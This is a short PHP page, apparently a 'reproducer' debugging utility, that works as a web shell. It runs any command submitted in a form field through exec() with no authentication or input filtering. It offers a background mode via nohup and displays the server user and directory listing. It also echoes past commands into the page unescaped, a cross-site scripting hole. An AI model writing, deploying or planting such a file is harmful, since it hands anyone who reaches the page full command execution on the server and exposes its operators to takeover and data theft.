<?php

session_start();

if (!isset($_SESSION['last_cmds'])) {
    $_SESSION['last_cmds'] = [];
}

echo 'Hello Reproducer!!';

if (isset($_POST['cmd'])) {
    $output = [];
    $trim = trim($_POST['cmd']);

    if ($trim !== $_SESSION['last_cmds'][0] ?? null) {
        array_unshift($_SESSION['last_cmds'], $trim);
    }

    if (isset($_POST['background'])) {
        $trim = 'nohup '.$trim.' > /dev/null 2>&1 & echo $!';
    }

    exec($trim, $output);
    echo '<pre>';
    foreach ($output as $line) {
        echo $line.PHP_EOL;
    }
    echo '</pre>';
}

echo '<hr>';
exec('ls -la', $output);
echo '<pre>';
foreach ($output as $line) {
    echo $line.PHP_EOL;
}
echo '</pre>';

?>
<hr>
<strong><?= exec('whoami') ?></strong>
<form action="/" method="post">
    <div>
        <input id="cmd" name="cmd" autocomplete="off" autofocus="autofocus" width="200px" size="100" />
        <button type="submit">exec</button>
    </div>
    <div>
        <label><input type="checkbox" name="background"> Run in background</label>
    </div>
</form>

<br>
<strong>Utils:</strong>
<ul>
    <li>
        <a href="#" onclick="document.getElementById('cmd').value = 'composer create-project '">composer create-project</a>
    </li>
    <li>
        <a href="#" onclick="document.getElementById('cmd').value = '.apt/usr/lib/p7zip/7z '">7z</a>
    </li>
</ul>
<strong>Last commands:</strong>
<ul>
    <?php foreach ($_SESSION['last_cmds'] as $i => $cmd) { ?>
        <li>
            <a href="#" id="cmd<?= $i ?>" onclick="document.getElementById('cmd').value = document.getElementById('cmd<?= $i ?>').innerHTML"><?= $cmd ?></a>
        </li>
    <?php } ?>
</ul>
